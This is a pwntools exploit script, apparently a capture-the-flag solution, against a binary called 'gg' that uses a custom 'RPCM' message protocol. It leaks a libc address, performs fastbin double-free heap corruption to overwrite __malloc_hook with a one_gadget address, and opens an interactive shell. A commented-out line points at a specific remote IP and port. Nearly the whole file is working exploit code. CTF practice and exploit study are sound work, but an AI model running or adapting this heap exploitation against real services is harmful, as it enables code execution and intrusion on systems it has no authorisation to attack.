from pwn import *
context(os='linux',arch='amd64')

p=process('./gg',env={'LD_PRELOAD':'./libc-2.23.so'})
#p=remote('115.159.100.108',1337)
elf = ELF('./gg')
libc = ELF('./libc-2.23.so')
def sendpkg(msg,uid,rec=0,err=0):
	m = p32(3)[::-1] +p32(32)[::-1] +uid + p32(36)[::-1]+'20829e66-d66b-429c-8963-d4e4937003d6' + p32(len(msg))[::-1] + msg
	l = len(m)+8
	m = 'RPCM'+p32(l)[::-1]+m
	p.send(m)
	if err:
		p.recvuntil('Error in: ')
		return 
	if not rec:
		p.recvuntil('\xbe\xef',timeout=2)
	#	print p.recv()




def recpkg(uid):
	m=p32(2)[::-1] +p32(32)[::-1]+uid+ p32(36)[::-1]+'20829e66-d66b-429c-8963-d4e4937003d6'
	l = len(m)+8
	m = 'RPCM'+p32(l)[::-1]+m
	p.send(m)
	p.recvuntil('\xbe\xf2')




p.send('RPCM'+p32(12)[::-1]+p32(0)[::-1])
p.recvuntil('\xbe\xef')	
p.send('RPCM'+p32(12)[::-1]+p32(1)[::-1])
p.recvuntil('\x00\x00\x00\x20')
uid = p.recv(32)
off = 10

def allocate(size,content,offset=0):
	p.sendlineafter(">> ","1")
	if offset:
		p.sendlineafter("Size: ",str(offset))
	p.sendlineafter("Size: ",str(size))
	p.sendlineafter("Message: ",content)

def show(index):
	p.sendlineafter(">> ","2")
	p.sendlineafter("Index: ",str(index))

def delete(index):
	p.sendlineafter(">> ","3")
	p.sendlineafter("Index: ",str(index))



sendpkg('_GG_gG_Gg_',uid,1)
p.recvuntil('Here is your key: ')
addr = int(p.recvuntil('\n')[:-1],16)
print hex(addr)
#libc_base = addr - (0x7f884c8578c0-0x7f884c4c0000)
libc_base = addr - (0x7fabe940c8e0-0x7fabe9048000)
one_addr = libc_base + 0xf1147
malloc_hook = libc_base +libc.symbols['__malloc_hook']
info("malloc_hook:0x%x",malloc_hook)
info("libc:0x%x",libc_base)
allocate(0x20,'aaa')
allocate(0x20,'bbb')
delete(0)
delete(1)
delete(0)
allocate(0x20,p64(0x61))
allocate(0x20,' ')
allocate(0x20,' ')

allocate(0x50,'aaa')
allocate(0x50,'aaa')
delete(3)
delete(4)
delete(3)
show(3)
p.recvuntil('Message: ')
heapaddr = u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))

main_arena=malloc_hook+0x10
info("heap addr :0x%x",heapaddr)

allocate(0x50,p64(main_arena+8))

allocate(0x50,'aaaaa')
allocate(0x50,'a'*0x28+p64(0x51)+p64(main_arena+0x58)+p64(main_arena+0x58))#5

allocate(0x50,'\x00'*0x40+p64(malloc_hook-0x10))#6

one_gadget=libc_base+0xf1147
allocate(0x50,p64(one_gadget))

p.sendline('1')
p.sendline('50')
p.interactive()
